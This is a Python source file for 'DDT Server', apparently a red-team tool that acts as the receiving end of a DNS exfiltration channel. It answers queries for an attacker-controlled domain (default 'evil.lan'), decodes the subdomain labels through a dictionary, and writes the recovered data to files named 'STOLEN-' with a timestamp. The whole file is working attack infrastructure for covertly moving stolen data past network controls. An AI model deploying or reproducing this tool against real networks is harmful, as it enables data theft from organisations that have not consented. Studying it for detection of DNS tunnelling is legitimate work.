from __future__ import print_function

import copy
import queue
import signal
import datetime
import time
import threading
import logging
import argparse,sys,time

from dnslib import RR
from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger


####
## Credit for FixedResolver: http://pydoc.net/dnslib/0.9.7/dnslib.fixedresolver/
## 
class FixedResolver(BaseResolver):
	def __init__(self,zone):
		self.rrs = RR.fromZone(zone)

	def resolve(self,request,handler):
		reply = request.reply()

		# Create a tuple as (transaction id,domain name)
		q.put((request.header.id, ".".join(request.q.qname.label)))

		qname = request.q.qname
		
		# Replace labels with request label
		for rr in self.rrs:
			a = copy.copy(rr)
			a.ttl = 0
			a.rname = qname
			reply.add_answer(a)
		return reply

def Decoder_function(q, dict):
	# Keep the thread alive
	while True:
		# Wait for incoming stuff in the queue
		while q.empty():
			time.sleep(1)

		output_filename = "STOLEN-"+datetime.datetime.now().strftime("%Y-%m-%d--%H-%M-%S"+".txt")
		output = open(output_filename, "w", 0)
		print ("Receiving incoming file; Writing it to "+output_filename)
		byte_counter = 0

		# Get all the input until EOF
		while True:

			# Get the next fragment out from the queue
			frag = q.get()
			ddt_frag = (frag[1].split("."+args.domain))[0]
		
			try:
				# Lookup the subdomain decoded value in the dictionary
				if ddt_frag == "final":
					print ("EOF Received; We received " + str(byte_counter) + " fragments.\n")
					output.close()
					break

				recovered_char = dict.get(ddt_frag).decode('string_escape')
#				logging.info("Received valid fragment as " + ddt_frag + "." + args.domain + " \twhich is\t " + recovered_char)
				print("Received valid fragment as " + ddt_frag + "." + args.domain + " \twhich is\t " + recovered_char)
				byte_counter +=1
				output.write(recovered_char)

			except:
				print("Lookup value not found for " + str(frag[1]))

	print ("DECODER EXITED - THIS SHOULD NOT HAPPEN!")

if __name__ == '__main__':

	print("""
  ___  ___ _____ 
 |   \|   \_   _|
 | |) | |) || |  
 |___/|___/ |_|  server v1.0 (by th3r3g3nt)
 Dictionary-based Data Transfer (via DNS)
 
 Definitely not good for your environment...
	
	""")
   	p = argparse.ArgumentParser(description="DDT Server v1.0")

	p.add_argument("--response","-r",default=". 60 IN A 172.217.4.132",
		metavar="<response>",
		help="DNS response (zone format) (default: 172.217.4.132)")

	p.add_argument("--dictionary","-d",default="dict.txt",
		metavar="<dictionary>",
		help="The dictionary lookup for the DNS names (default: dict.txt)")

	p.add_argument("--domain",default="evil.lan",
		metavar="<domain>",
		help = "The exfiltration domain, which you are the SOA")

	p.add_argument("--port","-p",type=int,default=53,
		metavar="<port>",
		help="Server port (default:53)")

	p.add_argument("--address","-a",default="",
		metavar="<address>",
		help="Listen address (default:all)")

	p.add_argument("--tcp",action='store_true',default=False,
		help="TCP server (default: UDP only)")

	p.add_argument("--log",default="-request,-reply",
		help="Log hooks to enable (default: +request,+reply,+truncated,+error,-recv,-send,-data)")

	p.add_argument("--log-prefix",action='store_true',default=False,
		help="Log prefix (timestamp/handler/resolver) (default: False)")

	p.add_argument("--verbose",action='store_true',default=False,
		help="Enable verbose output on the screen")
	
	args = p.parse_args()
    
	if args.verbose:
		logging.basicConfig(level=logging.INFO)

	# The reply engine
	resolver = FixedResolver(args.response)
	
	# Would love to use this more... Ain't nobody got time to figure this beauty out...
	logger = DNSLogger(args.log,args.log_prefix)
	
	q = queue.Queue() 


	# Create the DNS table for translation
	dict = {}

	# Manual special values
	logging.info('Adding magic values to the dictionary')

	dict["\n"] = "feed-n"
	dict["\r\n"] = "feed-rn"
	dict["\t"] = "tab"
	dict["\0"] = "final"


	try:
		with open(args.dictionary, "r") as dict_file:
			logging.info('Using '+args.dictionary+' as the dictionary file')
			for line in dict_file:
				name, var = line.partition(":@@SEP@@:")[::2]
				dict[name] = str(var.strip())
				logging.info('Dictionary entry created as dict[' + str(name) + '] = ' + str(var.strip()) )

		# Creating the reverse dictionary
		rev_dict = {v: k for k, v in dict.items()}

	except:
		print ("\n[E] Cannot open dictionary file " + args.dictionary + "\nPlease provide a valid dictionary file!\n")
		exit(1)


	logging.info('Building Decoder thread')
	decoder_thread = threading.Thread(target = Decoder_function, args = (q,rev_dict))
	decoder_thread.daemon=True
	decoder_thread.start()
	logging.info('Started  Decoder thread')

	logging.info('Building UDP Server thread')
	udp_server = DNSServer(	resolver,
				port = args.port,
				address = args.address,
				logger = logger,
				)
	udp_server.start_thread()
	logging.info('Started  UDP Server thread')

	print("Starting Fixed Resolver (%s:%d) [%s]" % (
		args.address or "*",
		args.port,
		"UDP/TCP" if args.tcp else "UDP"))

	if args.tcp:
		logging.info('Building TCP Server thread')
		tcp_server = DNSServer(	resolver,
					port=args.port,
					address=args.address,
					tcp=True,
					logger=logger)
		logging.info('Started  TCP Server thread')
		tcp_server.start_thread()

	while udp_server.isAlive():
        	time.sleep(1)
